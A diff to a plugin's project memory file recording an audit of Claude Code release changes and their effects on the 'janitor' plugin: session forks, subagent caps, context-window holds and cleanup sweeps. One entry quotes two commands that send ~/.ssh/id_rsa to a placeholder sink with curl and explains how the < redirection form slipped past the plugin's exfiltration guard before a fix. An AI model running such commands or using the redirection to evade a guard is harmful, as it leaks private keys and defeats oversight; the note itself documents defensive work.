@@ -1,6 +1,6 @@
 ---
 name: project_janitor_cc_changelog_currency
-description: "is the janitor up to date with the new Claude Code release / did the CC changelog break the janitor / what Claude Code changes affect the janitor plugin / bring the janitor up to date with Claude Code"
+description: "is the janitor up to date with the new Claude Code release / did the CC changelog break the janitor / what Claude Code changes affect the janitor plugin / bring the janitor up to date with Claude Code / a forked session cleared itself or reloaded plugins it already had / the exfil guard missed a < redirection / the context watchdog never fires and looks healthy / my LOCAL TRDDs under ~/.claude/projects vanished"
 ocd: 2026-06-11
 lmd: 2026-06-13
 metadata:
@@ -122,6 +122,58 @@ indicator), so a CC release can break or silently change it. Findings from the �
   flag remains the correct signal; only its frequency drops.
 - **2.1.198 — subagents run in the background by DEFAULT** (`run_in_background: true` on the
   `[janitor-memory-*]` spawn is now redundant but harmless — kept for explicitness).
+
+
+^ATOM-PD07-O9B4 [desc:"Claude Code compatibility audit 2.1.213-2.1.232: what broke, what was fixed, and what is still open", keywords: claude_code_compatibility_audit_through_2.1.232 session_start_source_fork input_redirection_exfil_bypass local_design_swept_by_session_cleanup hardcoded_1m_window_under_200k_hold subagent_spawn_cap_200_removed concurrent_subagent_cap_20 agent_name_colon_reserved, type: project, ocd: 2026-08-14, lmd: 2026-08-14]
+
+### Claude Code compatibility (changelog reviewed through **2.1.232**; audit ≥2.1.213)
+
+Extends the ≥2.1.198 sweep above. **Two genuine BREAKS found, both FIXED; two gaps still open.**
+
+- **2.1.214 — SessionStart now reports source `"fork"` instead of `"resume"`.** ❌ *BREAK, FIXED
+  (`fd43765c`).* `on-session-start` seeded `reload-acked.ts` only for `(startup, resume)`, and
+  `dispatch._phase_plugin_reload` treats an ABSENT stamp as 0 and self-heals by emitting
+  `[janitor-reload]` once — so a fork reloaded plugins it was already running. Compounded by
+  TRDD-VHPYSN56 (same day): a reload above the context threshold now SHRINKS FIRST, so the fork
+  would `/clear` the conversation it was forked to preserve. A missing enum value became
+  DESTRUCTIVE by composition with a feature added hours later. `external_clear.RESUME_SOURCES`
+  deliberately still excludes `fork` (a fork is neither away nor cold) — now documented as a
+  decision, not an accident.
+- **2.1.232 — Bash input redirections (`< file`) are permission-checked at the harness.** ❌
+  *BREAK in the janitor's OWN guard, FIXED (`91540ee9`).* `pre-bash-safety._SEPARATOR_RE` split on
+  `| ; && xargs` only, so a `<`-redirected exfil was ONE segment and never tripped
+  `check_compositional_exfil`. Reproduced: `cat ~/.ssh/id_rsa | curl -d @- <sink>` CAUGHT vs
+  `curl -d @- <sink> < ~/.ssh/id_rsa` ALLOWED — same source, same sink, one character apart. The
+  pipe form worked throughout, which is exactly why no test saw it. `<`, `<<<`, `<(` are now
+  separators (`<<<` must precede `<` in the alternation).
+- **2.1.223 — `CLAUDE_CODE_DISABLE_1M_CONTEXT` holds EVERY native-1M model to 200K.** ❌ *FIXED
+  (`226afce6`).* Two sites hardcoded a 1M fallback window, so under the hold occupancy
+  under-reported ~5x (190k reads as 19%, not 95%) and the ≥85% guard never fired — silently INERT,
+  not loudly wrong. `token_meter.default_window()` now resolves it from the environment and honors
+  falsy spellings. Narrow (only when no statusline snapshot is readable) and worse for it.
+- **2.1.228 — session cleanup was deleting inside a project's `memory/` folder.** ⚠ *OPEN —
+  TRDD-9DLBHWGV.* The FIX is the evidence: the sweep reaches inside `~/.claude/projects/<slug>/`
+  and only `memory/` was carved out. LOCAL TRDDs live in `<slug>/design/` (6 of them, verified) with
+  no carve-out and no mirror, while USER memory has one. Mirror, do not relocate — the LOCAL design
+  root is fixed by a USER-owned global rule.
+- **2.1.224 — the 200-subagent-per-session spawn cap was REMOVED.** ✅ *supersedes the 2.1.212 entry
+  above, which recorded that cap as a live constraint; it is no longer one (concurrency and depth
+  limits still apply).*
+- **2.1.217/2.1.219 — concurrent-subagent cap (default 20, `CLAUDE_CODE_MAX_CONCURRENT_SUBAGENTS`);
+  nested spawning disabled by default in 2.1.217, then restored to depth 3 in 2.1.219.** ✅ *no code
+  change. Two janitor agents carry the `Agent` tool (memory-subconscious, security), so their nested
+  spawns were silently no-ops on 2.1.217–2.1.218 and work again from 2.1.219.*
+- **2.1.218 — agent markdown rejects agent names containing `:`** (reserved for plugin namespacing).
+  ✅ *verified clean — all three janitor agents use a bare `name:`. The `plugin:agent` form is the
+  DISPATCH address, never the `name:` field. Do not "namespace" the frontmatter.*
+- **2.1.221 — plugins from `/plugin` activate immediately when safe.** ✅ *reload subsystem NOT
+  affected: the janitor's case is the DAEMON updating plugin files out-of-process, not `/plugin
+  install` (all `set_reload_flag` sites are in `daemon.py`).*
+- **Still open, lower severity:** GitLab token families + the `glab` config store are not covered by
+  the janitor's secret scanning (2.1.232 added them at the harness) — a LEVERAGE gap, not a break;
+  the marketplace settings keys (`additionalMarketplaces`/`allowedMarketplaces`, owner wildcards) are
+  read nowhere; `resolve_latest_published` is github.com-only now that GitLab marketplaces exist; and
+  `cache_prune`'s rmtree walk vs a `command`-source `mode: "link"` plugin dir wants checking.
 
 ## Notes and lessons learned
 
